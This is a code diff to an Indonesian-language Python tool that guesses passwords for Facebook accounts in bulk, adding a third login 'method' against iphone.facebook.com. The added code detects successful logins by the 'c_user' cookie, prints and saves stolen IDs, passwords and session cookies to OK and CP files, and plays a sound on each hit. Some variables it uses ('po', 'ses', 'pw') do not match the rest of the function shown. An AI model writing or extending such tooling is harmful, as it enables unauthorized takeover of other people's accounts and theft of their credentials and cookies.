@@ -892,12 +892,14 @@ def setting():
     else:
         print(' [+] Pilih Yang Bener Sayang ')
         exit()
-    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white] Metode Async[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Metode Mbasic[bold white]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
+    Console(width=80, style="bold cyan").print(Panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white] Metode Async[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Metode Mbasic[bold white]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white] Metode new[bold white] [/]',subtitle="╭───", subtitle_align="left", title="[bold green] Method"))
     hc = Console().input(f"[bold cyan]   ╰─> ")
     if hc in ['1','01']:
         method.append('_async')
     elif hc in ['2','02']:
         method.append('metode_api')
+    elif hc in ['3','03']:
+        method.append('methodnew')
     else:
         method.append('_async')
     Console().print(Panel(f'[bold yellow]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',title=f"[bold green]Setting Cek Apk",width=80,style=f"{color_panel}"))
@@ -973,8 +975,10 @@ def passwrd():
 				else:pass
 				if '_async' in method:
 					pool.submit(_async,idf,pwv)
-				if 'metode_api' in method:
+				elif 'metode_api' in method:
 					pool.submit(metode_api,idf,pwv)
+				elif 'methodnew' in method:
+					pool.submit(methodnew,idf,pwv)
 				else:
 					pool.submit(_async,idf,pwv)
 		print('')
@@ -993,7 +997,7 @@ def methodnew(idf,pwv):
 	rr=random.randint
 	auth1='Rudal-XD'
 	r=requests.Session()
-	prog.update(des,description=f'\r[bold white]Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
+	prog.update(des,description=f'\r[bold white]new [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
 	prog.advance(des)
 	hst= 'iphone.facebook.com'
 	ua='Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36'
@@ -1045,7 +1049,32 @@ def methodnew(idf,pwv):
 			cookie = requests.Session().cookies.get_dict()
 			next = 'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie)
-            
+			if "checkpoint" in po.cookies.get_dict().keys():
+				cp+=1
+				print('\n')
+				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+				statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
+				cetak(statuscp1)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=ses.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print('\n')
+				statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+				statusok1 = nel(statusok, width=80, style='bold green', title='OK')
+				cetak(statusok1)
+				os.popen('play-audio o.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
 #--------------------[ METODE VALIDATE ]-----------------#
 def _async(idf,pwv):
     global loop,ok,cp
